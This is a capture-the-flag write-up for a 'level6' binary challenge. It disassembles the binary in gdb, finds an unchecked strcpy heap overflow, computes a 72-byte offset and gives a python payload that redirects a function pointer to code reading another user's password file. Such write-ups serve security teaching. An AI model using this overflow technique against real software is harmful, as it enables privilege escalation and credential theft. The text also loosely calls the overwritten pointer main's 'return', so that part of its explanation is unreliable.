# Level 6

## First clue
- once logged in as level6 we find again an executable  owned by `level7` 
- we try to execute it without arguments and we get a segfault
- if we write one or more alpha and numeric argiments, we get back `Nope`

## Inspect with gdb
- Info function reveals main, n and m functions, but also a system call, malloc and strcpy. 
```
0x080482f4  _init
0x08048340  strcpy
0x08048340  strcpy@plt
0x08048350  malloc
0x08048350  malloc@plt
0x08048360  puts
0x08048360  puts@plt
0x08048370  system
0x08048370  system@plt
0x08048380  __gmon_start__
0x08048380  __gmon_start__@plt
0x08048390  __libc_start_main
0x08048390  __libc_start_main@plt
0x080483a0  _start
0x080483d0  __do_global_dtors_aux
0x08048430  frame_dummy
0x08048454  n
0x08048468  m
0x0804847c  main
0x080484e0  __libc_csu_init
0x08048550  __libc_csu_fini
0x08048552  __i686.get_pc_thunk.bx
0x08048560  __do_global_ctors_aux
0x0804858c  _fini

```
## Main
```
    0x0804847c <+0>:	push   %ebp
   0x0804847d <+1>:	mov    %esp,%ebp
   0x0804847f <+3>:	and    $0xfffffff0,%esp
   0x08048482 <+6>:	sub    $0x20,%esp
   0x08048485 <+9>:	movl   $0x40,(%esp)
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
   0x08048495 <+25>:	movl   $0x4,(%esp)
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    %eax,0x18(%esp)
   0x080484a5 <+41>:	mov    $0x8048468,%edx
   0x080484aa <+46>:	mov    0x18(%esp),%eax
   0x080484ae <+50>:	mov    %edx,(%eax)
   0x080484b0 <+52>:	mov    0xc(%ebp),%eax
   0x080484b3 <+55>:	add    $0x4,%eax
   0x080484b6 <+58>:	mov    (%eax),%eax
   0x080484b8 <+60>:	mov    %eax,%edx
   0x080484ba <+62>:	mov    0x1c(%esp),%eax
   0x080484be <+66>:	mov    %edx,0x4(%esp)
   0x080484c2 <+70>:	mov    %eax,(%esp)
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:	mov    0x18(%esp),%eax
   0x080484ce <+82>:	mov    (%eax),%eax
   0x080484d0 <+84>:	call   *%eax
   0x080484d2 <+86>:	leave  
   0x080484d3 <+87>:	ret    


```
- Disassemblying main we find out that it exposes a buffer flow vulnerability using a not protected strcpy:  strcpy is called to copy a string pointed to by %edx into the buffer allocated by malloc, whose address is stored in %eax. The problem with this code is that strcpy does not check the size of the destination buffer. It simply copies bytes from the source string until it encounters a null terminator (\0). If the source string is larger than the destination buffer, it will overflow the buffer.

## Function m

- it does nothing but call puts

## Function n (not called anywhere)
```
   0x08048454 <+0>:	push   %ebp
   0x08048455 <+1>:	mov    %esp,%ebp
   0x08048457 <+3>:	sub    $0x18,%esp
   0x0804845a <+6>:	movl   $0x80485b0,(%esp)
   0x08048461 <+13>:	call   0x8048370 <system@plt>
   0x08048466 <+18>:	leave  
   0x08048467 <+19>:	ret 

```
- interesting, it contains a system call.
If we inspect the argument passed to the system call we get this:
```
(gdb) x/s 0x80485b0
0x80485b0:	 "/bin/cat /home/user/level7/.pass"
```
- this is the reason why we need to find a way to execute function n.
- Function n addressn as it appears in `info function` is `0x08048454`
- if we find the offset of the buffer of strcpy in main and place in the return of main the address of n, insteadd of returning we execute the n function.

## Exploit
- to find the offset of the strcpy buffer we run the program in gdb passing as argument a long string made of set of 4 char (in 32 bit architecture alignement memory addresses are divisible by 4) of the alphabet, lower and uppercase:
```
(gdb) run "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz'
```
- we get `Program received signal SIGSEGV, Segmentation fault.
0x53535353 in ?? ()`
- 53 is the ASCII for "S" at position 73, so the end of the buffer is at position 72 => `echo "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRS" | grep -o .  |  wc -l`
- we store in /tmp/exploit 72 letters + the address of n function (reversed for little endian) and pass /tmp/exploit as argument to ./level6
- `python -c 'print "a"*72+"\x54\x84\x04\x08"' > /tmp/exploit`
- `./level6 $(cat /tmp/exploit)`
- we get the flag